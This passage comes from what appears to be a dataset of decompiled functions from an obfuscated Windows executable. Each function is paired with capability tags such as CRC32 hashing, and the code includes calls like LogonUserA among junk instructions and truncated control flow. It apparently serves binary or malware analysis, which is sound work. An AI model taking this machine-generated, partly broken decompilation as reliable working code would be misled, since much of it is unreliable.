0;\n                puVar20 = piVar18 + 1 ^ *(piVar18 + 0x4a);\n                uVar5 = in(0x9e);\n                uVar3 = uVar5 | 0x48;\n                if (-1 < uVar3) break;\n                *(piVar23 + -0x1b9c56e6) = *(piVar23 + -0x1b9c56e6) + -0x2444899f;\n                cVar26 = 0xffbf8f6f < (uVar5 | 0x48) ||\n                         CARRY4(sym.imp.USER32.dll_EqualRect + (uVar5 | 0x48), uVar3 < 0x8b);\n                uStack209 = 0x40;\n                cStack208 = '\\0';\n                (*piVar22)();\n                *(piVar23 + puVar20) = (*(piVar23 + puVar20) - extraout_CL_11) - cVar26;\n                uStack209 = in_CS;\n                cStack208 = in_CS >> 8;\n                cVar26 = cStack208;\n                in_CS = 0xfd21;\n                cStack208 = '4';\n                cVar27 = cStack208;\n                cStack208 = cVar26;\n                uVar5 = func_0x04bc038a();\n                piVar22 = uStack188;\n                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                piVar18 = uVar5 & 0xffff0000 | uVar17;\n                *piVar18 = *piVar18 << 0x1b;\n                out(puVar20[1], uVar17);\n                *(piVar23 + 1) = 0;\n                piVar18 = puVar20 + 2 ^ *(puVar20 + 0x4e);\n                uVar10 = in(0x9e);\n                piVar7 = piVar23 + 1;\n                if ((uVar10 | 0x48) < '\\0') {\n                    *(piVar23 + -0x1b9c56e2) = *(piVar23 + -0x1b9c56e2) + -0x2444899f;\n                    uStack207 = &uStack204 >> 8;\n                    uStack206 = &uStack204 >> 0x10;\n                    uStack205 = &uStack204 >> 0x18;\n                    uVar5 = CONCAT13(uStack61, CONCAT21(uStack63, uStack64));\n                    uVar24 = uVar5 ^ 0xc6471354;\n                    iVar4 = CONCAT11(uStack177, cStack178) * CONCAT11(uStack177, cStack178);\n                    cStack22 = iVar4;\n                    uStack21 = iVar4 >> 8;\n                    uVar19 = uVar5 + 0xc6471351;\n                    uStack28 = 0;\n                    uStack27 = 0;\n                    uStack26 = 0;\n                    uStack25 = 0;\n                    uVar9 = uVar17 & 1;\n                    uStack144 = uVar24;\n                    uStack143 = uVar24 >> 8;\n                    uStack141 = uVar24 >> 0x18;\n                    iVar6 = CONCAT22(uStack182, CONCAT11(uStack183, uStack184));\n                    piStack40 = uStack188;\n                    cVar26 = uVar9 < uVar19;\n                    if (uVar9 != uVar19) goto code_r0x0040415f;\n                    uStack209 = 0;\n                    cStack208 = cVar27;\n                    uStack36 = iVar6;\n                    (*_sym.imp.KERNEL32.dll_WritePrivateProfileStructW)();\n                    pcVar11 = iVar6 + uVar19 * 4;\n                    *pcVar11 = (*pcVar11 - extraout_CL_13) - cVar26;\n                    piVar7 = iVar6 + 4;\n                    uVar29 = in_CS;\n                    uStack209 = in_CS >> 8;\n                    in_CS = 0xfd21;\n                    uVar9 = func_0x04bc038a(uVar29);\n                    in_AF = 9 < (uVar9 & 0xf) | in_AF;\n                    uVar17 = CONCAT11((uVar9 >> 8) + in_AF, uVar9 + in_AF * '\\x06') & 0xff0f;\n                    piVar18 = uVar9 & 0xffff0000 | uVar17;\n                    *piVar18 = *piVar18 << 0x1b;\n                    out(*(uVar5 + 0xc6471355), uVar17);\n                    *piVar7 = 0;\n                    uVar10 = in(0x9e);\n                    if ((uVar10 | 0x48) < '\\0') goto code_r0x00404249;\n                    goto code_r0x004041d1;\n                }\n            }\n        }\n        if (uVar3 == 0) goto code_r0x004043f1;\n        goto code_r0x0040403f;\n    }\n    *(piVar23 + -0x1b9c56e2) = *(piVar23 + -0x1b9c56e2) + -0x2444899f;\n    *pcVar11 = *pcVar11 + uVar3;\n    cVar26 = pcVar11;\n    piVar22 = piVar22 & 0xffff0000 | CONCAT11((piVar22 >> 8) + cVar26, piVar22);\n    *pcVar11 = *pcVar11 + cVar26;\n    piVar23 = 0x39b8ecaf - (uVar5 & 0xffffff00 | cVar26 + extraout_CH);\n    puVar20 = uVar9 & 0xffff0000 | CONCAT11(uStack177, cStack178);\n    uStack36 = ~CONCAT22(uStack182, CONCAT11(uStack183, uStack184));\n    piVar18 = ~uStack188;\n    piVar14 = CONCAT21(uStack147, uStack148) & 1;\n    piStack40 = piVar18;\ncode_r0x0040460e:\n    uVar5 = puVar20 & 0xffff6280;\n    cStack22 = uVar5;\n    uStack21 = uVar5 >> 8;\n    uStack144 = 0;\n    uStack143 = 0;\n    uStack141 = 0;\n    cVar26 = piVar14 < piVar23;\n    if (piVar14 != piVar23) goto code_r0x0040415f;\n    uStack209 = 0;\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    *(piVar18 + uVar5) = (*(piVar18 + uVar5) - extraout_CL_20) - cVar26;\n    piVar23 = piVar18 + 1;\n    uVar29 = in_CS;\n    uStack209 = in_CS >> 8;\n    in_CS = 0xfd21;\n    uVar9 = func_0x04bc038a(uVar29);\n    in_AF = 9 < (uVar9 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar9 >> 8) + in_AF, uVar9 + in_AF * '\\x06') & 0xff0f;\n    piVar7 = uVar9 & 0xffff0000 | uVar17;\n    *piVar7 = *piVar7 << 0x1b;\n    out(*(uVar5 + 4), uVar17);\n    *piVar23 = 0;\n    uVar5 = in(0x9e);\n    uVar3 = uVar5 | 0x48;\n    pcVar11 = uVar5 | 0x48;\n    if (-1 < uVar3) {\n        pcVar11 = uVar5 & 0xffffff00 | uVar3 & 0xffffffb3;\n        *pcVar11 = *pcVar11 + (uVar3 & 0xffffffb3);\n        pcVar11[0x66] = pcVar11[0x66] + (uVar17 >> 8);\n        *piVar23 = *piVar23 + 8;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(piVar18 + -0x1b9c56e2) = *(piVar18 + -0x1b9c56e2) + -0x2444899f;\n    *pcVar11 = *pcVar11 + uVar3;\n    *(piVar22 + 0x198f0913) = *(piVar22 + 0x198f0913) + 8;\n    puVar20 = CONCAT13(uStack175, CONCAT12(uStack176, CONCAT11(uStack177, cStack178)));\n    uVar17 = CONCAT11(uStack177, cStack178) * 2;\n    piVar7 = piVar23 & 0xffff0000 | uVar17;\n    uVar5 = pcVar11 ^ 0xc6471359;\n    cStack22 = uVar17;\n    uStack21 = uVar17 >> 8;\n    uStack144 = uVar5;\n    uStack143 = uVar5 >> 8;\n    uStack141 = uVar5 >> 0x18;\n    piStack40 = uStack188 | 0x39585989;\n    piVar22 = CONCAT22(uStack182, CONCAT11(uStack183, uStack184));\n    bVar28 = pcVar11 == 0x39b8ecaf;\n    uStack36 = piVar22;\ncode_r0x00404723:\n    if (!bVar28) goto code_r0x0040415f;\n    goto code_r0x00404d7e;\ncode_r0x00404954:\n    uStack26 = uStack182;\n    uStack25 = uStack182 >> 8;\n    cVar26 = '\\0';\n    (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA)();\n    *(piVar7 + uVar9) = (*(piVar7 + uVar9) - extraout_CL_24) - cVar26;\n    in_CS = 0xfd21;\n    uVar5 = func_0x04bc038a(uVar29);\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar18 = uVar5 & 0xffff0000 | uVar17;\n    *piVar18 = *piVar18 << 0x1b;\n    out(*(uVar9 + 4), uVar17);\n    *(piVar7 + 1) = 0;\n    uVar5 = in(0x9e);\n    if (-1 < (uVar5 | 0x48)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(piVar7 + -0x1b9c56e2) = *(piVar7 + -0x1b9c56e2) + -0x2444899f;\n    cStack22 = -0x34;\n    uStack19 = 0x54;\n    piStack40 = piVar18 + -0x17d3e16d;\n    piVar18 = CONCAT22(uStack182, CONCAT11(uStack183, uStack184)) + -1 + (0x17d3e16c < piVar18);\n    uStack144 = 9;\n    uStack143 = 0;\n    uStack141 = 0;\n    uStack36 = piVar18;\n    if ((CONCAT13(uStack145, CONCAT21(uStack147, uStack148)) &\n        (CONCAT13(uStack61, CONCAT21(uStack63, uStack64)) ^ 0x39b8ecae)) != (uVar5 & 0xffffff14)) goto code_r0x0040415f;\ncode_r0x004043a5:\n    iVar6 = uStack84;\n    piVar7 = CONCAT13(uStack84, uStack88._1_3_);\n    piVar22 = CONCAT13(uStack80, uStack84._1_3_);\n    uVar17 = CONCAT11(uStack176, uStack177) | 0x3849;\n    puVar20 = piVar18 & 0xffff0000 | uVar17;\n    cVar26 = '\\0';\n    uStack195 = CONCAT13(uStack52, uStack56._1_3_) + 0xd14c1128 ^ piVar7 |\n                CONCAT13(uStack48, uStack52._1_3_) + -1 + (0x2eb3eed7 < CONCAT13(uStack52, uStack56._1_3_)) ^ piVar22;\n    uStack21 = uVar17;\n    uStack20 = uVar17 >> 8;\n    if (uStack195 == 0) goto code_r0x00404d7e;\n    uStack27 = uStack159;\n    uStack26 = uStack159 >> 8;\n    uStack25 = uStack157;\n    uStack24 = uStack156;\n    uStack209 = 0x40;\n    cStack208 = '\\0';\n    (*_sym.imp.USER32.dll_DefMDIChildProcW)();\n    *(piVar7 + puVar20) = (*(piVar7 + puVar20) - extraout_CL_04) - cVar26;\n    uStack209 = in_CS;\n    cStack208 = in_CS >> 8;\n    in_CS = 0xfd21;\n    uVar5 = func_0x04bc038a();\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar18 = uVar5 & 0xffff0000 | uVar17;\n    pcVar13 = CONCAT31(extraout_ECX_01 >> 8, 8);\n    *piVar18 = *piVar18 << 0x1b;\n    out(puVar20[1], uVar17);\n    *(piVar7 + 1) = 0;\n    uVar5 = puVar20 + 2 ^ *(puVar20 + 0x4e);\n    uVar9 = in(0x9e);\n    uVar3 = uVar9 | 0x48;\n    pcVar11 = uVar9 | 0x48;\n    if (-1 < uVar3) {\n        pcVar11 = pcVar11 + 1;\n        *pcVar11 = *pcVar11 + pcVar11;\n        *pcVar13 = *pcVar13 + (iVar6 >> 0x10);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(piVar7 + -0x1b9c56e2) = *(piVar7 + -0x1b9c56e2) + -0x2444899f;\n    *(pcVar11 + piVar18 * 4) = in_FS;\n    *pcVar11 = *pcVar11 + uVar3;\n    *(piVar22 + -0x1db9f6eb) = *(piVar22 + -0x1db9f6eb) + 8;\n    pcVar11 = &uStack209 & 0xffffffac;\n    cVar26 = pcVar11;\n    *pcVar11 = *pcVar11 + cVar26;\n    *(piVar22 + -0x1dbaf6e3) = *(piVar22 + -0x1dbaf6e3) + 8;\n    pcVar11 = &uStack209 & 0xffff0000 | CONCAT11(0x24, cVar26);\n    *pcVar11 = *pcVar11 + cVar26;\n    while( true ) {\n        cVar26 = 0x39b8ecae < pcVar13;\n        uStack209 = 0x40;\n        cStack208 = '\\0';\n        (*0x406d08)();\n        pcVar11 = uVar5 * 4 + 0x406d08;\n        *pcVar11 = (*pcVar11 - extraout_CL_05) - cVar26;\n        uStack209 = in_CS;\n        cStack208 = in_CS >> 8;\n        in_CS = 0xfd21;\n        uVar9 = func_0x04bc038a();\n        in_AF = 9 < (uVar9 & 0xf) | in_AF;\n        uVar17 = CONCAT11((uVar9 >> 8) + in_AF, uVar9 + in_AF * '\\x06') & 0xff0f;\n        piVar18 = uVar9 & 0xffff0000 | uVar17;\n        pcVar13 = CONCAT31(extraout_ECX_02 >> 8, 8);\n        *piVar18 = *piVar18 << 0x1b;\n        out(*(uVar5 + 4), uVar17);\n        *0x406d0c = 0;\n        uVar9 = in(0x9e);\n        uVar3 = uVar9 | 0x48;\n        if (uVar3 < '\\0') break;\n        *(uVar9 | 0x48) = *(uVar9 | 0x48) + uVar3;\n        uStack32 = uStack180;\n        uVar5 = CONCAT13(uStack184, uStack188._1_3_);\n        piStack40 = uStack188 & 0xffffff00 | piStack40 & 0xff;\n        uStack36 = CONCAT31(CONCAT21(uStack182, uStack183), uStack184);\n    }\n    *0xe4a41626 = *0xe4a41626 + -0x2444899f;\n    Var2 = CONCAT12(uStack175, CONCAT11(uStack176, uStack177));\n    piVar22 = CONCAT13(uStack174, Var2);\n    uVar9 = Var2 & 0xffff;\n    piVar23 = uVar9 | 0x400000;\n    iVar4 = -0x6611 - uVar9;\n    piVar18 = CONCAT22(uVar5 + 8 >> 0x10 ^ *(uVar5 + 0x4e) >> 0x10, iVar4);\n    uStack21 = iVar4;\n    uStack20 = iVar4 >> 8;\n    pcVar11 = CONCAT13(uStack144, CONCAT12(uStack145, uStack147));\n    uStack32 = 0;\n    piStack40 = piStack40 & 0xff | 0xab757e00;\n    uStack36 = 0x5d;\n    cVar26 = pcVar11 < pcVar13;\n    if (pcVar11 == pcVar13) goto code_r0x0040458f;\ncode_r0x00403de7:\n    uStack209 = 0x40;\n    cStack208 = '\\0';\n    (*_sym.imp.KERNEL32.dll_GetUserDefaultLCID)();\n    *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL_07) - cVar26;\n    uStack209 = in_CS;\n    cStack208 = in_CS >> 8;\n    uVar25 = 0xfd21;\n    uVar5 = func_0x04bc038a();\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar7 = uVar5 & 0xffff0000 | uVar17;\n    *piVar7 = *piVar7 << 0x1b;\n    out(piVar18[1], uVar17);\n    *(piVar23 + 1) = 0;\n    uVar19 = piVar18 + 2 ^ *(piVar18 + 0x4e);\n    uVar5 = in(0x9e);\n    uVar3 = uVar5 | 0x48;\n    uVar9 = uVar5 | 0x48;\n    if (-1 < uVar3) {\n        uVar9 = uVar3 & 0xffffffb3;\n        pcVar11 = uVar5 & 0xffffff00 | uVar9;\n        *pcVar11 = *pcVar11 + uVar9;\n        *(uVar19 + 0x39) = *(uVar19 + 0x39) + ((uVar5 & 0xffffff00) >> 8);\n        return pcVar11;\n    }\n    *(piVar23 + -0x1b9c56e2) = *(piVar23 + -0x1b9c56e2) + -0x2444899f;\n    pcVar11 = &uStack209 & 0xffffff90;\n    *pcVar11 = *pcVar11 + pcVar11;\n    *(piVar22 + -0x1f30f6e3) = *(piVar22 + -0x1f30f6e3) + 8;\n    out(1, pcVar11);\n    *(uVar9 + 0xac) = *(uVar9 + 0x18);\n    *(uVar9 + 0xa8) = *(uVar9 + 0x14) | 0x33a488ce;\n    piVar22 = *(uVar9 + 0x18) & 0xffff0000 | *(uVar9 + 0x1e) | 0x219;\n    *(uVar9 + 0xba) = piVar22;\n    *(uVar9 + 0xb4) = pcVar11 - *(uVar9 + 0x30);\n    *(uVar9 + 0x40) = CONCAT31(extraout_ECX_03 >> 8, 8) - *(uVar9 + 0x90);\n    uVar5 = *(uVar9 + 0x30) & 0x604c889e;\n    *(uVar9 + 0xb4) = uVar5;\n    cVar26 = uVar19 < (piVar7 ^ 0x39b8ecaf);\n    if (uVar19 != (piVar7 ^ 0x39b8ecaf)) goto code_r0x0040415f;\n    uStack205 = 0xd5;\n    uStack204 = 0x4b;\n    auStack203[0] = 0x40;\n    (*_sym.imp.ADVAPI32.dll_LogonUserA)();\n    pcVar11 = uVar5 + uVar19 * 4;\n    *pcVar11 = (*pcVar11 - extraout_CL_27) - cVar26;\n    piVar23 = uVar5 + 4;\n    in_CS = 0xfd21;\n    uStack207 = 0xe4;\n    uStack206 = 0x4b;\n    uStack205 = 0x40;\n    uStack204 = 0;\n    auStack203[0] = uVar25;\n    uVar5 = func_0x04bc038a();\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar14 = uVar5 & 0xffff0000 | uVar17;\n    piVar15 = CONCAT31(extraout_ECX_14 >> 8, 8);\n    *piVar14 = *piVar14 << 0x1b;\n    out(*(uVar19 + 4), uVar17);\n    *piVar23 = 0;\n    piVar18 = uVar19 + 8 ^ *(uVar19 + 0x4e);\n    pcVar11 = in(0x9e);\n    if ((pcVar11 | 0x48) < '\\0') {\ncode_r0x00404bfb:\n        uStack207 = 0x35;\n        *(piVar23 + -0x1b9c56e6) = *(piVar23 + -0x1b9c56e6) + -0x2444899f;\n        *(piVar15 + 0x1bf46041) = *(piVar15 + 0x1bf46041) >> 0xb;\n        uStack206 = auStack203 >> 8;\n        uStack205 = auStack203 >> 0x10;\n        uStack204 = auStack203 >> 0x18;\n        piVar18 = CONCAT13(uStack180, CONCAT21(uStack182, uStack183));\n        iVar6 = ((pcVar11 & 0xffffff14) - piVar18) - (piVar15 < piVar14);\n        piStack40 = piStack40 & 0xff | (piVar15 - piVar14) * 0x100;\n        uStack36._1_3_ = iVar6;\n        uStack36 = CONCAT31(uStack36._1_3_, piVar15 - piVar14 >> 0x18);\n        uStack32 = iVar6 >> 0x18;\n        uVar5 = CONCAT13(uStack60, CONCAT12(uStack61, uStack63)) ^ 0x39b8ecaf;\n        cVar26 = CONCAT13(uStack144, CONCAT12(uStack145, uStack147)) < uVar5;\n        if (CONCAT13(uStack144, CONCAT12(uStack145, uStack147)) == uVar5) goto code_r0x00403a48;\n        goto code_r0x0040458f;\n    }\n    goto code_r0x00404b3b;\ncode_r0x00404524:\n    cVar26 = '\\0';\n    uVar5 = CONCAT13(uStack157, CONCAT21(uStack159, uStack160)) & 0x48a52d81;\n    uStack28 = uVar5;\n    uStack27 = uVar5 >> 8;\n    uStack26 = uVar5 >> 0x10;\n    uStack25 = uVar5 >> 0x18;\n    uStack209 = 0;\n    (*0x406cd2)();\n    *(piVar18 + puVar20) = (*(piVar18 + puVar20) - extraout_CL_17) - cVar26;\n    piVar7 = piVar18 + 1;\n    uVar29 = in_CS;\n    uStack209 = in_CS >> 8;\n    in_CS = 0xfd21;\n    uVar5 = func_0x04bc038a(uVar29);\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar23 = uVar5 & 0xffff0000 | uVar17;\n    *piVar23 = *piVar23 << 0x1b;\n    out(puVar20[1], uVar17);\n    *piVar7 = 0;\n    uVar9 = puVar20 + 2 ^ *(puVar20 + 0x4e);\n    uVar5 = in(0x9e);\n    if (-1 < (uVar5 | 0x48)) {\n        pcVar11 = (uVar5 | 0x48) + 0xb4248489;\n        *pcVar11 = *pcVar11 + pcVar11;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *(piVar18 + -0x1b9c56e2) = *(piVar18 + -0x1b9c56e2) + -0x2444899f;\n    pcVar11 = (uVar5 | 0x48) & 0xffffff3c;\n    goto code_r0x00404575;\ncode_r0x00404249:\n    *(piVar7 + -0x1b9c56e6) = *(piVar7 + -0x1b9c56e6) + -0x2444899f;\n    cStack22 = ~CONCAT11(uStack177, cStack178);\n    uStack21 = ~CONCAT11(uStack177, cStack178) >> 8;\n    piVar18 = CONCAT13(uStack157, CONCAT21(uStack159, uStack160)) * 2;\n    uStack28 = piVar18;\n    uStack27 = piVar18 >> 8;\n    uStack26 = piVar18 >> 0x10;\n    uStack25 = piVar18 >> 0x18;\n    piVar23 = CONCAT13(uStack61, CONCAT21(uStack63, uStack64)) + -0x39b8eca7;\n    uStack36 = NULL;\n    piStack40 = 0x1fffe7a5;\n    uStack144 = SUB41(piVar23, 0);\n    uStack143 = piVar23 >> 8;\n    uStack141 = piVar23 >> 0x18;\n    cVar26 = false;\n    if ((uStack148 & 1) != 0) goto code_r0x0040415f;\n    goto code_r0x00403de7;\ncode_r0x00403a2b:\n    *piVar23 = 0;\n    piVar18 = piVar14 ^ *(piVar14 + 0x46);\n    uVar9 = in(0x9e);\n    uVar5 = uVar9 | 0x48;\n    if (-1 < (uVar9 | 0x48)) goto code_r0x004039ed;\n    *(piVar23 + -0x1b9c56e6) = *(piVar23 + -0x1b9c56e6) + -0x2444899f;\n    uVar3 = in(0xb);\n    puVar8 = uVar9 & 0xffffff00 | uVar3;\n    cVar26 = CARRY1(*puVar8, uVar3);\n    *puVar8 = *puVar8 + uVar3;\ncode_r0x00403a48:\n    uStack209 = 0x40;\n    cStack208 = '\\0';\n    (*_sym.imp.SHELL32.dll_ExtractIconA)();\n    *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL_00) - cVar26;\n    piVar23 = piVar23 + 1;\n    uStack209 = in_CS;\n    cStack208 = in_CS >> 8;\n    in_CS = 0xfd21;\n    uVar5 = func_0x04bc038a();\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar7 = uVar5 & 0xffff0000 | uVar17;\n    *piVar7 = *piVar7 << 0x1b;\n    out(piVar18[1], uVar17);\n    *piVar23 = 0;\n    piVar14 = piVar18 + 2 ^ *(piVar18 + 0x4e);\n    uVar5 = in(0x9e);\n    pcVar11 = uVar5 | 0x48;\n    if ((uVar5 | 0x48) < '\\0') goto code_r0x00403a75;\n    goto code_r0x00403a2b;\ncode_r0x00403a75:\n    *(piVar23 + -0x1b9c56e6) = *(piVar23 + -0x1b9c56e6) + -0x2444899f;\n    *pcVar11 = *pcVar11 + pcVar11;\n    *(piVar14 + -0x75) = *(piVar14 + -0x75) + (pcVar11 >> 8);\n    uStack30 = uStack190 ^ 0xff;\n    uVar5 = CONCAT22(uStack63, CONCAT11(uStack64, uStack68._3_1_)) ^ 0x39b8eca5;\n    uStack145 = uVar5;\n    uStack144 = uVar5 >> 8;\n    uStack143 = uVar5 >> 0x10;\n    uVar17 = CONCAT11(cStack178, uStack179) & 0xe719;\n    uStack23 = uVar17;\n    cStack22 = uVar17 >> 8;\n    if ((CONCAT22(uStack147, CONCAT11(uStack148, uStack149)) & (pcVar11 & 0xffffff1e) + 0xc6471352) != 0)\n    goto code_r0x0040415f;\n    cVar26 = '\\0';\n    uStack209 = 0;\n    (*0x406c7e)();\n    *(piVar23 + piVar14) = (*(piVar23 + piVar14) - extraout_CL_01) - cVar26;\n    piVar22 = piVar23 + 1;\n    uVar29 = in_CS;\n    uStack209 = in_CS >> 8;\n    in_CS = 0xfd21;\n    uVar5 = func_0x04bc038a(uVar29);\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar18 = uVar5 & 0xffff0000 | uVar17;\n    *piVar18 = *piVar18 << 0x1b;\n    out(piVar14[1], uVar17);\n    *piVar22 = 0;\n    piVar14 = piVar14 + 2 ^ *(piVar14 + 0x4e);\n    uVar5 = in(0x9e);\n    uVar3 = uVar5 | 0x48;\n    if (uVar3 < '\\0') {\n        *(piVar23 + -0x1b9c56e2) = *(piVar23 + -0x1b9c56e2) + -0x2444899f;\n        iVar6 = CONCAT13(uStack61, CONCAT21(uStack63, uStack64));\n        piVar23 = 0x39b8ecaf - iVar6;\n        pcVar12 = iVar6 + -0x39b8ecb9;\n        uStack36 = NULL;\n        piStack40 = 0x15efc77c;\n        piVar18 = NULL;\ncode_r0x00403b44:\n        uStack144 = SUB41(pcVar12, 0);\n        uStack143 = pcVar12 >> 8;\n        uStack141 = pcVar12 >> 0x18;\n        if (piVar18 == piVar23) {\n            cVar26 = '\\0';\n            uStack28 = 0xfc;\n            uStack27 = 0x6f;\n            uStack26 = 0xc0;\n            uStack25 = 0x56;\n            uStack209 = 0;\n            (*_sym.imp.Secur32.dll_DeleteSecurityContext)();\n            *(piVar22 + piVar14) = (*(piVar22 + piVar14) - extraout_CL_25) - cVar26;\n            uStack209 = in_CS >> 8;\n            uVar5 = func_0x04bc038a(in_CS);\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n            piVar18 = uVar5 & 0xffff0000 | uVar17;\n            *piVar18 = *piVar18 << 0x1b;\n            out(piVar14[1], uVar17);\n            *(piVar22 + 1) = 0;\n            uVar5 = in(0x9e);\n            if (-1 < (uVar5 | 0x48)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(piVar22 + -0x1b9c56e2) = *(piVar22 + -0x1b9c56e2) + -0x2444899f;\n            iVar6 = -7;\n            if ((CONCAT31(extraout_ECX_12 >> 8, 8) & (uVar5 | 0x48) & 0xffffff3c) == 0) {\n                iVar6 = CONCAT13(uStack61, CONCAT21(uStack63, uStack64)) + 0x6bf3c688;\n            }\n            uStack144 = iVar6;\n            uStack143 = iVar6 >> 8;\n            uStack141 = iVar6 >> 0x18;\n        }\ncode_r0x0040415f:\n        return CONCAT13(uStack141, CONCAT21(uStack143, uStack144));\n    }\n    pcVar11 = uVar5 & 0xffffff00 | uVar3 & 0xffffff40;\n    piVar23 = piVar22;\n    goto code_r0x00403a75;\n}\n",
        "token_count": 21904
    },
    "00406740": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406740(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uchar in_XMM1 [16];\n    uint auStack224 [16];\n    uint uStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint32_t uStack148;\n    uint *puStack144;\n    uint32_t uStack140;\n    int32_t iStack136;\n    uint32_t uStack132;\n    uchar auStack128 [8];\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack108;\n    uint64_t auStack104 [4];\n    int32_t iStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uint uStack60;\n    uint *puStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint8_t uStack41;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    int32_t iStack28;\n    ushort uStack22;\n    uint var_ch;\n    \n    uVar3 = uStack41;\n    uVar2 = uStack48;\n    iStack28 = 0;\n    uStack32 = 0x48448317;\n    uStack52 = 0x4b598ca4;\n    uStack48 = uStack48 * 0x723d429a;\n    uStack60 = 0;\n    uStack64 = 0x38b0d101;\n    puStack56 = auStack224;\n    uStack148 = 6;\n    while( true ) {\n        uStack132 = uStack148;\n        iStack152 = 0;\n        do {\n            uStack36 = 0;\n            uStack40 = 0x9cd77cd;\n            *(auStack104 + iStack152) = *(iStack152 + 0x435c67) - *(iStack152 + 0x435cc5);\n            iStack152 = iStack152 + 1;\n        } while (iStack152 != 0xe);\n        iStack68 = 0;\n        do {\n            iStack108 = iStack68;\n            uStack156 = 0;\n            uStack160 = 0x241d13b3;\n            uVar1 = *(auStack104 + iStack68);\n            in_XMM1 = psraw(CONCAT142(SUB1614(CONCAT133(CONCAT121(SUB1612(CONCAT115(CONCAT101(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(uVar1 >> 0x38, \n                                                                      CONCAT114(SUB161(in_XMM1 >> 0x38, 0), \n                                                                                SUB1614(in_XMM1, 0))) >> 0x70, 0), \n                                                            CONCAT113(uVar1 >> 0x30, SUB1613(in_XMM1, 0))) >> 0x68, 0), \n                                                            CONCAT112(SUB161(in_XMM1 >> 0x30, 0), SUB1612(in_XMM1, 0)))\n                                                            >> 0x60, 0), CONCAT111(uVar1 >> 0x28, SUB1611(in_XMM1, 0)))\n                                                            >> 0x58, 0), \n                                                            CONCAT110(SUB161(in_XMM1 >> 0x28, 0), SUB1610(in_XMM1, 0)))\n                                                            >> 0x50, 0), CONCAT19(uVar1 >> 0x20, SUB169(in_XMM1, 0))) >>\n                                                            0x48, 0), \n                                                            CONCAT18(SUB161(in_XMM1 >> 0x20, 0), SUB168(in_XMM1, 0))) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (SUB167(in_XMM1, 0) >> 0x18) << 0x30) >> 0x30, 0), \n                                                            uVar1 >> 0x10), (SUB165(in_XMM1, 0) >> 0x10) << 0x20) >>\n                                                            0x20, 0), uVar1 >> 8), (SUB163(in_XMM1, 0) >> 8) << 0x10) >>\n                                              0x10, 0), SUB162(in_XMM1, 0) & 0xff | uVar1 << 8), 8);\n            _auStack128 = in_XMM1;\n            iStack68 = iStack68 * 2;\n            puStack144 = auStack224 + iStack68;\n            iStack72 = 0;\n            if ((0x6d7e1dae - uStack32 ^ 0x241d13b3 | -(0x6d7e1dae < uStack32) - iStack28) == 0) {\n                return 0;\n            }\n            auStack128._0_4_ = SUB164(in_XMM1, 0);\n            auStack128._4_4_ = SUB164(in_XMM1 >> 0x20, 0);\n            uStack120 = SUB164(in_XMM1 >> 0x40, 0);\n            uStack116 = SUB164(in_XMM1 >> 0x60, 0);\n            iVar4 = 0x4b598cac - uStack52;\n            *(auStack224 + iStack68) = auStack128._0_4_;\n            *(auStack224 + iStack68 + 4) = auStack128._4_4_;\n            *(auStack224 + iStack68 + 8) = uStack120;\n            *(auStack224 + iStack68 + 0xc) = uStack116;\n            iStack68 = iStack108 + iVar4;\n            uStack36 = 0;\n            uStack40 = 0x48448317;\n            uStack48 = 0;\n        } while (iStack68 != 0x20);\n        uStack36 = 0;\n        uStack40 = 0;\n        iStack72 = 0;\n        uStack41 = uVar3 | 0xe5;\n        if (*puStack56 == 0) break;\n        